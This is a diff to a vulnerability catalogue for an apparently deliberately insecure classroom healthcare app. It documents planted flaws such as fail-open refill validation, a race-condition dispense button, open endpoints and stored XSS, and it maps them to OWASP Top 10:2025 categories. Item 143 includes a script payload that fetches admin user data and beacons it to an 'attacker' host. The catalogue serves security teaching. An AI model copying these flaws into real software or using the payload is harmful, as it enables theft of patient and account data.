+`failureReason` carries the raw `e.toString()` of every swallowed validator exception: fully-qualified exception class, original message, DB constraint and table names. The list endpoint returns it verbatim — CWE-209 — and the React table renders it with `dangerouslySetInnerHTML`, turning a thrown exception into a stored-XSS payload that ships to every viewer.
+
+---
+
+**137. [A10][A09] Absolute filesystem path leaked in `tempSlipPath` — `RefillRequestDto.java`**
+The `tempSlipPath` field exposes the JVM's resolved temp-file path (e.g. `/tmp/refill-1234567890.slip` or `/var/folders/.../T/refill-…`). Any caller of `GET /api/refills` reads internal filesystem layout used by the server process — useful reconnaissance for path-traversal sinks elsewhere in the codebase.
+
+---
+
+**138. [A10] `/refills/{id}/retry` has no max-retry guard — `RefillController.java`**
+```java
+@PostMapping("/{id}/retry")
+public ResponseEntity<RefillRequestDto> retry(@PathVariable Long id) {
+    return ResponseEntity.ok(refills.retry(id));
+}
+```
+CWE-400 — no max-retry value, no rate limit. Each retry re-enters `processOne` which calls `SlipPrinter.createSlip` and creates a new temp file (vulnerability #135). A `while true` curl loop from a single attacker exhausts the server's temp filesystem.
+
+---
+
+**139. [A01][A10] `/api/refills/**` mapped to `permitAll()` — `SecurityConfig.java`**
+```java
+.requestMatchers("/api/refills/**").permitAll()
+```
+Anonymous callers can submit `quantity: null`, fire the concurrent-dispense race, hit the unbounded retry, and read the leaked `failureReason` / `tempSlipPath` from every row. A01 compounds A10 — no authentication is required to exercise any of the error-path defects.
+
+---
+
+**140. [A10] "Request Refill" frontend button sends `quantity: null` on purpose — `PrescriptionsPage.tsx`**
+```tsx
+api.post('/refills', {
+  prescriptionId: p.id,
+  patientId: p.patientId,
+  requestedBy: user?.id ?? null,
+  quantity: null,    // [A10] CWE-754 — triggers backend validator NPE → fail-open
+})
+```
+The new "Refill" action button on every prescription row submits `quantity: null` so the backend validator NPEs and the fail-open chain promotes the new refill request to `READY` without ever checking eligibility. `requestedBy` is also body-supplied (`[A07]`).
+
+---
+
+**141. [A10] Dispense button on `RefillsPage` not disabled in-flight — `RefillsPage.tsx`**
+```tsx
+<Button onClick={() => dispenseMutation.mutate(r.id)}>Dispense</Button>
+```
+The button is rendered without `disabled={dispenseMutation.isPending}`. A single rapid double-click reproduces the CWE-362 TOCTOU race from the UI; the explicit "Force Concurrent Dispense" button (vulnerability #142) is provided for guaranteed reproduction.
+
+---
+
+**142. [A10] "Force Concurrent Dispense" demo button — `RefillsPage.tsx`**
+```tsx
+await Promise.all(
+  Array.from({ length: 10 }).map(() =>
+    api.post(`/refills/${id}/dispense`, { pharmacistId: user?.id })))
+```
+Fires 10 parallel `POST /refills/{id}/dispense` against the same row using `Promise.all`. With no `@Version` column and no row-level lock in the backend, the server services every call against the same `READY` state — the inventory decrement happens ten times but only the last audit-log row is written. Reproducible from the classroom UI without a load-test tool.
+
+---
+
+**143. [A10][A05] `failureReason` rendered with `dangerouslySetInnerHTML` — `RefillsPage.tsx`, `AdminPage.tsx`, `ProfilePage.tsx`**
+```tsx
+<div dangerouslySetInnerHTML={{ __html: r.failureReason }} />
+```
+The raw `failureReason` returned by the API is interpolated as HTML in three places (queue table, admin panel, patient profile). An attacker who can shape a thrown exception (`<script>fetch('/api/admin/users').then(r=>r.text()).then(t=>navigator.sendBeacon('//attacker',t))</script>`) plants a stored XSS payload that fires the next time any user views one of those pages. Extends the existing Messages-page XSS pivot (#84).
+
+---
+
+**144. [A10][CWE-209] Stack-Trace Inspector panel — `RefillsPage.tsx`**
+```tsx
+<pre>{selected.failureReason ?? '(none)'}</pre>
+<pre>{selected.tempSlipPath ?? '(none)'}</pre>
+```
+The detail dialog renders `failureReason` and `tempSlipPath` verbatim in `<pre>` blocks — same pattern as the existing Token Inspector widget (#83). The inspector turns every swallowed backend exception into a directly readable reconnaissance surface for the API caller.
+
+---
+
+## OWASP Top 10:2025 Category Summary
+
+> Rows are ordered to match the **OWASP Top 10:2025** list. Where the old project labels merged
+> two related buckets (e.g. file-upload / path-traversal under `[A03]` + XSS / SQLi under `[A05]`),
+> those entries are now consolidated under the appropriate 2025 category.
 
 | ID | Category | Where |
 |---|---|---|
 | A01 | Broken Access Control | `SecurityConfig.java` (`permitAll` on `/api/admin/**`); `UserController.java` (IDOR, mass assignment on role, all users exposed, PUT /users/{id} no ownership check #95); `AppointmentController.java` (IDOR GET, IDOR PUT #92); `MedicalRecordController.java` (any doctor for any patient; GET all records no access control #93; PUT /{id} no ownership check #107); `LabResultController.java` (IDOR; null patientId → all results exposed #113); `MessageController.java` (conversation IDOR, delete without ownership check, GET /conversations userId not verified #94; PATCH /{id}/read no ownership check #115; DELETE /{id} no ownership check #116); `AdminController.java` (admin endpoints open to all callers; PATCH /users/{id}/toggle no ADMIN check #118); `PatientController.java` (IDOR — full PII without ownership check #89); `StatsController.java` (aggregate statistics — user counts by role, appointment trends, message volume — exposed without any role check #90 #91); `LabResultService.java` (null patientId → all results exposed #106); `PrescriptionController.java` (dispense no role check #108); **Frontend**: `ProtectedRoute.tsx` (client-side RBAC bypass #78); `App.tsx` + `AdminPage.tsx` (admin route no role guard #86); `App.tsx` + `StaffDashboardPage.tsx` (/staff route no role guard #102); `Sidebar.tsx` (unread badge userId param not verified #101; role-based dashboard link client-side only #103); `DashboardPage.tsx` (client-side patient filter on appointments #104); `StaffDashboardPage.tsx` (client-side doctor filter on appointments #105); `MedicalRecordsPage.tsx` (Edit button all roles #111; Dispense button all roles #112); `AdminPage.tsx` (active toggle no ADMIN check #121); `PrescriptionsPage.tsx` (patient IDOR #124; all prescriptions no role check #125; dispense no pharmacist check #126) |
-| A02 | Cryptographic Failures | `application.yaml`, `V10`/`V11`/`V12` (MD5 seed passwords for all 9 accounts #96), `JwtUtil.java` (weak key), `SecurityConfig.java` (NoOpPasswordEncoder, no security headers); `MedicalRecordController.java` (filesystem path in response); `AdminController.java` (`GET /config` exposes raw datasource.password and all env vars); `GlobalExceptionHandler.java` (raw exception messages + fully-qualified class names + DB table names forwarded to client); **Frontend**: `AuthContext.tsx` (passwordHash in localStorage #79); `LoginPage.tsx` (raw server error in UI #80); `DashboardPage.tsx` (passwordHash column in admin table #82); `AdminPage.tsx` (password field type="text" in create modal #120; MD5 hash copyable in user table #122) |
-| A03 | Injection / File Upload | `MedicalRecordService.java` (unrestricted upload + Path Traversal write via `getOriginalFilename()`; Path Traversal read via `filePath` param); `LabResultService.java` (predictable filename without UUID; Path Traversal read via `filePath` param) |
-| A04 | Insecure Design | `V2` (PII plaintext), `User.java` (passwordHash in response), `PasswordUtils.java` (MD5, timing attack), `AuthController.java` (JWT in body); `UserService.java` (passwordHash in every response); `LoggingInterceptor.java` (password params + response body logged verbatim, spoofable IP from X-Forwarded-For); **Frontend**: `AuthContext.tsx` (JWT + passwordHash in localStorage #76, #79; unverified JWT decode #77); `axiosInstance.ts` (localStorage read on every request #81); `DashboardPage.tsx` (Token Inspector widget #83; user ID in greeting banner #99); `ProfilePage.tsx` (JWT in URL query param on export #85); `LabResultsPage.tsx` (export to clipboard includes patient ID without access check #114) |
-| A05 | Injection / XSS | `SecurityConfig.java` (wildcard CORS, no security headers), `V8` + `Message.java` (Stored XSS); `AppointmentService.java` (SQL injection via `doctorName`); `LabResultService.java` (4×SQLi: 3 string params + 1 numeric UNION without closing quotes); `MessageService.java` (Stored XSS via unsanitized content); `LoggingInterceptor.java` (Log Injection via unsanitized User-Agent CR/LF); `StatsController.java` (GET /recent — all users' events with no auth filter #97; unreadMessages system-wide count #98); **Frontend**: `MessagesPage.tsx` (`dangerouslySetInnerHTML` Stored XSS #84); `DashboardPage.tsx` (recent activity feed renders cross-user events #100) |
-| A06 | Security Misconfiguration / Missing Business Logic | `AppointmentService.java` (no state machine on status transitions); `PrescriptionService.java` (double dispensing allowed, CANCELLED → DISPENSED allowed — no state machine #110) |
-| A07 | Auth Failures / Mass Assignment | `JwtUtil.java` (30-day expiry, algorithm confusion), `JwtAuthenticationFilter.java` (skip expiry paths, swallowed exceptions), `AuthService.java` (user enumeration, no rate limiting), `CustomUserDetailsService.java` (user enumeration), all `*Dto.java`; `UserController.java` (`GET /delete/{id}` — delete via GET); `MessageService.java` (sender spoofing); `PrescriptionService.java` (pharmacistId from body #109); `AdminController.java` (role from body → instant ADMIN creation); **Frontend**: `RegisterPage.tsx` (ADMIN role selectable on signup #frontend); `AdminPage.tsx` (role change Mass Assignment #87; create user role from body #119); `MessagesPage.tsx` (senderId editable in compose form #88; replySenderId editable in inline reply — impersonate any user #117); `PrescriptionsPage.tsx` (pharmacistId from request body — audit identity spoofable #127) |
-| A08 | Software and Data Integrity Failures / Resource Exhaustion | `pom.xml` (JJWT CVE-2024-31033), `MedicalRecord.java` (no content_hash); `AppointmentController.java` (PDF without Content-MD5); `MedicalRecordService.java` (no hash computed at upload); `LoggingInterceptor.java` (`ex.printStackTrace(pw)` — full JVM stack trace persisted to DB, CWE-209); `ContentCachingFilter.java` + `application.yaml` (unbounded heap buffering, CWE-400 DoS via single oversized request) |
-| A09 | Security Logging and Monitoring Failures | `AdminController.java` (`POST /logs/clear` permanently deletes entire audit trail without authorization — evidence destruction attack); `LoggingInterceptor.java` (plaintext passwords and JWT tokens stored in audit_logs; logging errors silently swallowed); `AdminPage.tsx` (Clear All Logs button fires immediately with no confirmation — single click destroys forensic timeline #123) |
+| A02 | Security Misconfiguration | `AppointmentService.java` (no state machine on status transitions); `PrescriptionService.java` (double dispensing allowed, CANCELLED → DISPENSED allowed — no state machine #110); `SecurityConfig.java` (wildcard CORS, no security headers) |
+| A03 | Software Supply Chain Failures | `pom.xml` (JJWT CVE-2024-31033 — outdated transitive dependency with known signature-bypass vulnerability) |
+| A04 | Cryptographic Failures | `application.yaml`, `V10`/`V11`/`V12` (MD5 seed passwords for all 9 accounts #96), `JwtUtil.java` (weak key), `SecurityConfig.java` (NoOpPasswordEncoder, no security headers); `MedicalRecordController.java` (filesystem path in response); `AdminController.java` (`GET /config` exposes raw datasource.password and all env vars); `GlobalExceptionHandler.java` (raw exception messages + fully-qualified class names + DB table names forwarded to client); **Frontend**: `AuthContext.tsx` (passwordHash in localStorage #79); `LoginPage.tsx` (raw server error in UI #80); `DashboardPage.tsx` (passwordHash column in admin table #82); `AdminPage.tsx` (password field type="text" in create modal #120; MD5 hash copyable in user table #122) |
+| A05 | Injection | `MedicalRecordService.java` (unrestricted upload + Path Traversal write via `getOriginalFilename()`; Path Traversal read via `filePath` param); `LabResultService.java` (predictable filename without UUID; Path Traversal read via `filePath` param; 4×SQLi: 3 string params + 1 numeric UNION without closing quotes); `AppointmentService.java` (SQL injection via `doctorName`); `V8` + `Message.java` (Stored XSS); `MessageService.java` (Stored XSS via unsanitized content); `LoggingInterceptor.java` (Log Injection via unsanitized User-Agent CR/LF); `StatsController.java` (GET /recent — all users' events with no auth filter #97; unreadMessages system-wide count #98); **Frontend**: `MessagesPage.tsx` (`dangerouslySetInnerHTML` Stored XSS #84); `DashboardPage.tsx` (recent activity feed renders cross-user events #100) |
+| A06 | Insecure Design | `V2` (PII plaintext), `User.java` (passwordHash in response), `PasswordUtils.java` (MD5, timing attack), `AuthController.java` (JWT in body); `UserService.java` (passwordHash in every response); `LoggingInterceptor.java` (password params + response body logged verbatim, spoofable IP from X-Forwarded-For); **Frontend**: `AuthContext.tsx` (JWT + passwordHash in localStorage #76, #79; unverified JWT decode #77); `axiosInstance.ts` (localStorage read on every request #81); `DashboardPage.tsx` (Token Inspector widget #83; user ID in greeting banner #99); `ProfilePage.tsx` (JWT in URL query param on export #85); `LabResultsPage.tsx` (export to clipboard includes patient ID without access check #114) |
+| A07 | Authentication Failures | `JwtUtil.java` (30-day expiry, algorithm confusion), `JwtAuthenticationFilter.java` (skip expiry paths, swallowed exceptions), `AuthService.java` (user enumeration, no rate limiting), `CustomUserDetailsService.java` (user enumeration), all `*Dto.java`; `UserController.java` (`GET /delete/{id}` — delete via GET); `MessageService.java` (sender spoofing); `PrescriptionService.java` (pharmacistId from body #109); `AdminController.java` (role from body → instant ADMIN creation); **Frontend**: `RegisterPage.tsx` (ADMIN role selectable on signup); `AdminPage.tsx` (role change Mass Assignment #87; create user role from body #119); `MessagesPage.tsx` (senderId editable in compose form #88; replySenderId editable in inline reply — impersonate any user #117); `PrescriptionsPage.tsx` (pharmacistId from request body — audit identity spoofable #127) |
+| A08 | Software or Data Integrity Failures | `MedicalRecord.java` (no content_hash); `AppointmentController.java` (PDF without Content-MD5); `MedicalRecordService.java` (no hash computed at upload); `ContentCachingFilter.java` + `application.yaml` (unbounded heap buffering, CWE-400 DoS via single oversized request) |
+| A09 | Security Logging and Alerting Failures | `AdminController.java` (`POST /logs/clear` permanently deletes entire audit trail without authorization — evidence destruction attack); `LoggingInterceptor.java` (plaintext passwords and JWT tokens stored in audit_logs); `AdminPage.tsx` (Clear All Logs button fires immediately with no confirmation — single click destroys forensic timeline #123) |
+| A10 | Mishandling of Exceptional Conditions | **Async Refill Queue feature** (see `A10_FEATURE_PLAN.md`): `RefillQueueService.java` (fail-open promote-to-READY on any validator exception — CWE-636 #128; `catch (Throwable)` around slip printing — CWE-396 #129; `@Scheduled` worker swallows every exception — CWE-755 #130; TOCTOU race on dispense — CWE-362 #131; swallowed `InterruptedException` — CWE-705 #132); `EligibilityValidator.java` (no null check — CWE-754 #133); `V16__create_refill_requests.sql` (schema permits null quantity that triggers the NPE — CWE-665 #134; no UNIQUE constraint for the double-dispense race); `SlipPrinter.java` (write outside try/finally — CWE-460 #135); `RefillRequestDto.java` (raw `failureReason` exception text leaked — CWE-209 #136; absolute `tempSlipPath` leaked #137); `RefillController.java` (`/retry` has no max-retry guard — CWE-400 #138); `SecurityConfig.java` (`/api/refills/**` mapped to `permitAll()` — A01 compounds A10 #139). **Frontend**: `PrescriptionsPage.tsx` (Request Refill button submits `quantity: null` on purpose — feeds the fail-open chain #140); `RefillsPage.tsx` (Dispense button not disabled in-flight — CWE-362 reproducible from UI #141; "Force Concurrent Dispense" button fires 10 parallel calls #142; `failureReason` rendered with `dangerouslySetInnerHTML` — stored XSS pivot #143; Stack-Trace Inspector renders raw exception text + absolute paths — CWE-209 #144); `AdminPage.tsx` + `ProfilePage.tsx` (also render `failureReason` as raw HTML — #143). **Related existing items also touching A10**: `JwtAuthenticationFilter.java` (silently swallows JWT parse exceptions and proceeds as anonymous), `LoggingInterceptor.java` (`ex.printStackTrace(pw)` + logging errors silently swallowed — CWE-209 / CWE-755), `GlobalExceptionHandler.java` (returns raw exception class + message to client). |
